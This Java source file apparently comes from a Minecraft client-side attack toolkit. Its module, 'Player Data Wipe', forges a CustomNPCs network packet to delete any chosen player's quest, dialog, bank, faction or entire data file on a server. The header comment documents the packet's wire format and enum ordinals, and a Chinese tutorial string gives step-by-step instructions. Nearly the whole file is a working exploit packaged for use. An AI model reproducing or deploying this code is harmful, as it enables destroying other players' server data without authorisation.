package com.redblue.red.modules.customnpcs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CNPC-05: Player Data Wipe -- delete arbitrary player's CustomNPCs data.
 *
 * Vuln #9 (index 98): SPacketPlayerDataRemove
 * Wire: writeEnum(EnumPlayerData) + writeUtf(name) + writeInt(id)
 *
 * EnumPlayerData ordinals (verified from bytecode):
 *   0=Players, 1=Quest, 2=Dialog, 3=Transport, 4=Bank, 5=Factions
 *
 * writeEnum internally calls writeVarInt(ordinal).
 * writeUtf has maxLength=32767 in decode.
 *
 * Requires: wand tool (default) + GLOBAL_PLAYERDATA permission.
 * type=Players calls File.delete() on the player's data file.
 */
public class CNPC05_PlayerDataWipe implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("customnpcs", "packets");
    private static final int IDX_PLAYER_DATA_REMOVE = 98;

    // EnumPlayerData ordinals
    private static final int PLAYERS = 0;
    private static final int QUEST = 1;
    private static final int DIALOG = 2;
    private static final int TRANSPORT = 3;
    private static final int BANK = 4;
    private static final int FACTIONS = 5;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger", "确认: 此操作将永久删除数据", false),
        ConfigParam.ofPlayer("target_player", "目标玩家"),
        ConfigParam.ofEnum("data_type", "删除类型", "Quest",
                "Players", "Quest", "Dialog", "Transport", "Bank", "Factions"),
        ConfigParam.ofInt("data_id", "数据ID(Quest/Dialog等)", 0, 0, 2147483647)
    );

    @Override public String id() { return "cnpc05_player_data_wipe"; }
    @Override public String name() { return "玩家数据删除"; }
    @Override public String description() { return "删除任意玩家的CustomNPCs进度数据"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 手持 CustomNPCs wand\n"
            + "2. 勾选危险确认\n"
            + "3. 选择目标玩家和删除类型\n"
            + "4. 点击执行\n\n"
            + "[删除类型]\n"
            + "Players -- 删除整个玩家数据文件(最危险)\n"
            + "Quest -- 删除指定任务进度\n"
            + "Dialog -- 删除指定对话记录\n"
            + "Transport -- 删除指定传送点\n"
            + "Bank -- 删除指定银行数据\n"
            + "Factions -- 删除指定阵营数据\n\n"
            + "[权限要求]\n"
            + "需要 GLOBAL_PLAYERDATA 权限 + wand 物品";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("customnpcs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        boolean confirmed = getParam("confirm_danger")
                .map(ConfigParam::getBool).orElse(false);
        if (!confirmed) return;

        String target = getParam("target_player")
                .map(ConfigParam::getString).orElse("");
        if (target.isEmpty()) return;

        String typeStr = getParam("data_type")
                .map(ConfigParam::getString).orElse("Quest");
        int dataId = getParam("data_id")
                .map(ConfigParam::getInt).orElse(0);

        int ordinal = switch (typeStr) {
            case "Players" -> PLAYERS;
            case "Quest" -> QUEST;
            case "Dialog" -> DIALOG;
            case "Transport" -> TRANSPORT;
            case "Bank" -> BANK;
            case "Factions" -> FACTIONS;
            default -> QUEST;
        };

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_PLAYER_DATA_REMOVE);
            // writeEnum = writeVarInt(ordinal)
            buf.writeVarInt(ordinal);
            // writeUtf(name)
            buf.writeUtf(target);
            // writeInt(id)
            buf.writeInt(dataId);
        });
    }
}
